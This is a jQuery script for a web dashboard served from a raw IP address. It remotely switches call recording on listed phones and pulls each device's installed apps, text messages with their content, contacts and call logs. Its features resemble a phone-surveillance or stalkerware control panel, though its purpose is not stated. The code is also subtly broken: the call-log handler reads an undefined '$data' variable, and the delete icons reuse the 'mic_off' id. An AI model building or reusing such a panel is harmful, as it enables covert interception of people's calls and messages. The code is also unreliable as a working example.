$(document).ready(function() {

    $('#dataTable').dataTable();
    $('#phonetable').dataTable();

    var locations = location.href.split('/');    
    if (locations.length == 6) {
        var dropselvalue = parseInt(sessionStorage.getItem("current_group"));
        $('#group_type').val(locations[5]);
    } else {
        $('#group_type').val(2);
    }

    $('#group_type').on('change', function() {
        if (window.sessionStorage) {
            sessionStorage.setItem("current_group", this.value);
            console.log(parseInt(sessionStorage.getItem("current_group")));
        }

        location.replace("http://124.248.202.226/manage/device/" + this.value);
    });

    $("#phonetable").on("click", '#mic_off', function(event) {
        var device_id = $(this).attr("data-id"); 
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226/manage/device/callRecord",
            dataType: "json",
            data: {status: false, device_id: device_id, _token: $('meta[name="csrf-token"]').attr('content')},
            success: function (response) {
                console.log(response);
                location.reload();
            },
            error: function(error) {
                alert('Can not set data');
            }
        })
    });

    $("#phonetable").on("click", '#mic_on', function(event) {
        var device_id = $(this).attr("data-id"); 
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226/manage/device/callRecord",
            dataType: "json",
            data: {status: true, device_id: device_id, _token: $('meta[name="csrf-token"]').attr('content')},
            success: function (response) {
                console.log(response);
                location.reload();
            },
            error: function(error) {
                alert('Can not set data');
            }
        })
    });

    $("#phonetable").on("click", '#edit_user', function(event) {
        var device_id = $(this).attr("data-id");
        var data_phone = $(this).attr("data-phone");
        var data_nickname = $(this).attr("data-nickname");
        
        $('#modalProfileLabel').html(data_phone);
        $('#nickname').val(data_nickname);
        $('#device_id').val(device_id);

        $('#edit_device').modal('show');
    });

    $("#phonetable").on("click", '#device_status', function(event) {
        var device_id = $(this).attr("data-id");
        $.ajax({
            type: "POST",
            url: "http://124.248.202.226/manage/device/status",
            dataType: "json",
            data: {status: this.checked, device_id: device_id, _token: $('meta[name="csrf-token"]').attr('content')},
            success: function (response) {
                console.log(response);
            },
            error: function(error) {
                alert('Can not set data');
            }
        })
    });

    $("#phonetable").on("click", '#app_list', function(event) {

        $('#applist_table').dataTable().fnDestroy()

        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226/device/applist/' + device_id;
        
        $('#applist_table').DataTable({
            "ajax":{
                "url": endpoint,
                "dataType": "json",
                "dataSrc": function ( json ) {
                    let appLists = json.app_lists;
                    for (let index = 0; index < appLists.length; index++) {
                        appLists[index].no = index + 1;
                        appLists[index].operation = "<div class='peers mR-15'><div class='peer'><span id='mic_off' class='td-n c-blue-400 cH-blue-400 fsz-def p-5'><i class='fa fa-trash'></i></span>"
                    }

                    return appLists;
                }
            },
            "columns": [
                {"data": "no"},
                {"data": "name"},
                {"data": "version"},
                {"data": "package"},
                {"data": "installed_at"},
                {"data": "upgraded_at"},
                {"data": "operation"}
            ]
        });

        $('#modal_app_list').modal('show');
    });

    $("#phonetable").on("click", '#msg_log', function(event) {

        $('#msglogs_table').dataTable().fnDestroy()

        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226/device/msglogs/' + device_id;
        
        $('#msglogs_table').DataTable({
            "ajax":{
                "url": endpoint,
                "dataType": "json",
                "dataSrc": function ( json ) {
                    let logs = json.msg_logs;
                    for (let index = 0; index < logs.length; index++) {
                        logs[index].no = index + 1;
                    }

                    return logs;
                }
            },
            "columns": [
                {"data": "no"},
                {"data": "phone"},
                {"data": "content"},
                {"data": "send_time"},
                {"data": "direction"}                
            ]
        });

        $('#modal_msg_logs').modal('show');
    });

    $("#phonetable").on("click", '#contact_list', function(event) {

        $('#contacts_table').dataTable().fnDestroy()

        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226/device/contacts/' + device_id;
        
        $('#contacts_table').DataTable({
            "ajax":{
                "url": endpoint,
                "dataType": "json",
                "dataSrc": function ( json ) {
                    let contacts = json.contacts;
                    for (let index = 0; index < contacts.length; index++) {
                        contacts[index].no = index + 1;
                        contacts[index].operation = "<div class='peers mR-15'><div class='peer'><span id='mic_off' class='td-n c-blue-400 cH-blue-400 fsz-def p-5'><i class='fa fa-trash'></i></span>";
                    }

                    return contacts;
                }
            },
            "columns": [
                {"data": "no"},
                {"data": "name"},
                {"data": "phone"},
                {"data": "operation"}           
            ]
        });

        $('#modal_contacts').modal('show');
    });

    $("#phonetable").on("click", '#call_log', function(event) {
        $('#call_logs_table').dataTable().fnDestroy()

        var device_id = $(this).attr("data-id");
        let endpoint = 'http://124.248.202.226/device/calllogs/' + device_id;
        
        $('#call_logs_table').DataTable({
            "ajax":{
                "url": endpoint,
                "dataType": "json",
                "dataSrc": function ( json ) {
                    let contacts = json.callLogs;
                    for (let index = 0; index < contacts.length; index++) {
                        contacts[index].type = ($data['direction'] == 1) ? '수신' : '발신';
                        contacts[index].name = "";
                    }

                    return contacts;
                }
            },
            "columns": [
                {"data": "type"},
                {"data": "name"},
                {"data": "phone"},
                {"data": "duration"},
                {"data": "call_time"}           
            ]
        });

        $('#modal_call_logs').modal('show');
    });
})